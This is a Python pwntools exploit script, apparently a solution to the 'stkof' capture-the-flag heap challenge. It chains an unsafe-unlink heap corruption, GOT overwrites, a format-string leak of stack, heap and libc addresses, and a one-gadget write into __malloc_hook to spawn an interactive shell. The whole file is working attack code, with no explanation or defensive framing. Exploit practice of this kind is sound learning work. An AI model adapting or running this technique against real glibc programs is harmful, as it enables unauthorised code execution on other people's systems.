#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def send(payload):
    sleep(0.1)
    p.send(payload)
    
def sendline(payload):
    sleep(0.1)
    p.sendline(payload)

def alloc(size):
    sendline(b'1')
    sendline(str(size))

def update(index, size, content):
    sendline(b'2')
    sendline(str(index))
    sendline(str(size))
    sendline(content)

def delete(index):
    sendline(b'3')
    sendline(str(index))

def dump(index):
    sendline(b'4')
    sendline(str(index))

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF('./stkof')
p = process('./stkof')

alloc(0x28) # 1
alloc(0x28) # 2
alloc(0x80) # 3
alloc(0x38) # 4

FD = 0x602140 + 0x8 * 2 - 0x18
BK = 0x602140 + 0x8 * 2 - 0x10
payload = flat(
        0, 0x20,
        FD, BK,
        0x20, 0x90)
update(2, len(payload), payload)

# unlink
delete(3)

# rewrite pointer array
payload = flat(
        0, 0x602140,
        elf.got['strlen'], elf.got['free'])
update(2, len(payload), payload)

# rewrite strlen@got to printf@plt
payload = p64(elf.plt['printf'])
update(1, len(payload), payload)

# leak stack & heap
payload = b'|%9$p|%13$p|'
update(4, len(payload), payload)
dump(4)

p.recvuntil(b'|')
heap  = int(p.recvuntil(b'|', drop=True), 16) - 0x12
stack = int(p.recvuntil(b'|', drop=True), 16)

log.info('stack: {:#x}'.format(stack))
log.info('heap : {:#x}'.format(heap))

# leak libc
dump(2)

p.recvuntil(b'OK\n')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x844f0

log.info('libc : {:#x}'.format(libc.address))

# write one-gadget to __malloc_hook
payload = flat(
        0x602140, libc.symbols['__malloc_hook'])
update(0, len(payload), payload)

payload = p64(libc.address + one_gadgets[2])
update(1, len(payload), payload)

# trigger one-gadget
alloc(0x87)

p.interactive()
